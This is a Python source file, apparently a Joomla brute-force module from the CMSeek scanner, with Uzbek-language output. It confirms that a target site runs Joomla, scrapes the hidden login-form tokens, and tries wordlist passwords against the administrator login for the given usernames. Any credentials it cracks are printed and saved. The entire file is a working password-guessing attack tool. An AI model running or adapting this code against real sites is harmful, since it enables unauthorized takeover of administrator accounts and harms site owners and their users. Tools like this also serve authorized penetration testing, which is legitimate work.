#!/usr/bin/python3
# -*- coding: utf-8 -*-

import cmseekdb.basic as cmseek
import cmseekdb.sc as source # Contains function to detect cms from source code
import cmseekdb.header as header # Contains function to detect CMS from gathered http headers
import cmseekdb.generator as generator
import multiprocessing ## Let's speed things up a lil bit (actually a hell lot faster) shell we?
from functools import partial ## needed somewhere :/
import sys
import cmseekdb.generator as generator
import re
import urllib.request, urllib.error, urllib.parse
import http.cookiejar
from html.parser import HTMLParser

class extInpTags(HTMLParser):

    def __init__(self):
        HTMLParser.__init__(self)
        self.return_array = {}

    def handle_starttag(self, tag, attrs):
        if tag == "input":
            name  = None
            value = None
            for nm,val in attrs:
                if nm == "name":
                    name = val
                if nm == "value":
                    value = val
            if name is not None and value is not None:
                self.return_array.update({name:value})


def testlogin(url,user,passw):
    url = url + '/administrator/index.php'
    cj = http.cookiejar.FileCookieJar("cookieszz")
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
    joomloginsrc = opener.open(url).read().decode()
    parser = extInpTags()
    post_array = parser.feed(joomloginsrc)
    main_param = {'username':user, 'passwd':passw}
    other_param = parser.return_array
    post_data = main_param.copy()
    post_data.update(other_param)
    post_datad = urllib.parse.urlencode(post_data).encode("utf-8")
    ua = cmseek.randomua('generatenewuaeverytimetobesafeiguess')
    try:
        with opener.open(url, post_datad) as response:
            scode = response.read().decode()
            headers = str(response.info())
            rurl = response.geturl()
            r = ['1', scode, headers, rurl] ## 'success code', 'source code', 'http headers', 'redirect url'
            return r
    except Exception as e:
        e = str(e)
        r = ['2', e, '', ''] ## 'error code', 'error message', 'empty'
        return r
    print('hola')


def start():
    cmseek.clearscreen()
    cmseek.banner("Joomla Brutfors Moduli")
    url = cmseek.targetinp("") # input('URLni kiriting: ')
    cmseek.info("Joomla uchun tekshirilmoqda")
    bsrc = cmseek.getsource(url, cmseek.randomua('foodislove'))
    joomcnf = '0'
    if bsrc[0] != '1':
        cmseek.error("Maqsad manbasini olish imkonsiz, CMSeek yopilmoqda")
        cmseek.handle_quit()
    else:
        ## Parse generator meta tag
        parse_generator = generator.parse(bsrc[1])
        ga = parse_generator[0]
        ga_content = parse_generator[1]

        try1 = generator.scan(ga_content)
        if try1[0] == '1' and try1[1] == 'joom':
            joomcnf = '1'
        else:
            try2 = source.check(bsrc[1], url)
            if try2[0] == '1' and try2[1] == 'joom':
                joomcnf = '1'
            else:
                try3 = header.check(bsrc[2]) # Sarlavhalar tekshiruvi!
                if try3[0] == '1' and try3[1] == 'joom':
                    joomcnf = '1'
                else:
                    joomcnf = '0'
    if joomcnf != '1':
        cmseek.error('Joomla tasdiqlanmadi... CMSeek yopilmoqda')
        cmseek.handle_quit()
    else:
        cmseek.success("Joomla tasdiqlandi... Forma va token tasdiqlanmoqda...")
        joomloginsrc = cmseek.getsource(url + '/administrator/index.php', cmseek.randomua('thatsprettygay'))
        if joomloginsrc[0] == '1' and '<form' in joomloginsrc[1]:
            # joomtoken = re.findall(r'type=\"hidden\" name=\"(.*?)\" value=\"1\"', joomloginsrc[1])
            # if len(joomtoken) == 0:
            #    cmseek.error('Token olish imkonsiz... CMSeek yopilmoqda!')
            #    cmseek.handle_quit()
            # cmseek.success("Token muvaffaqiyatli olingan: " + cmseek.bold + joomtoken[0] + cmseek.cln)
            # token = joomtoken[0]
            joomparamuser = []
            rawuser = input("[~] Foydalanuvchi nomlarini vergul bilan ajratib kiriting, bo'sh joy qo'ymang (masalan: cris,harry): ").split(',')
            for rusr in rawuser:
                joomparamuser.append(rusr)
            joombruteusers = set(joomparamuser) ## Takrorlanadigan foydalanuvchi nomlarini olib tashlash
            for user in joombruteusers:
                passfound = '0'
                print('\n')
                cmseek.info("Foydalanuvchi uchun brutfors: " + cmseek.bold + user + cmseek.cln)
                with open("wordlist/passwords.txt", "r") as pwd_file:
                    passwords = pwd_file.read().split('\n')
                passwords.insert(0, user)
                for password in passwords:
                    if password != '' and password != '\n':
                        sys.stdout.write('[*] Parol sinovdan o‘tkazilmoqda: ')
                        sys.stdout.write('%s\r\r' % password)
                        sys.stdout.flush()
                        cursrc = testlogin(url, user, password)
                        if 'logout' in str(cursrc[1]):
                            print('\n')
                            cmseek.success('Parol topildi!')
                            print(" |\n |--[foydalanuvchi]--> " + cmseek.bold + user + cmseek.cln + "\n |\n |--[parol]--> " + cmseek.bold + password + cmseek.cln + "\n |")
                            cmseek.success('Ov muvaffaqiyatli yakunlandi!')
                            cmseek.savebrute(url,url + '/administrator/index.php',user,password)
                            passfound = '1'
                            break
                        else:
                            continue
                        break
                if passfound == '0':
                        cmseek.error('\n\nParol topilmadi!')
                print('\n\n')

        else:
            cmseek.error("Kirish formasi topilmadi... CMSeeK yopilmoqda")
            cmseek.handle_quit()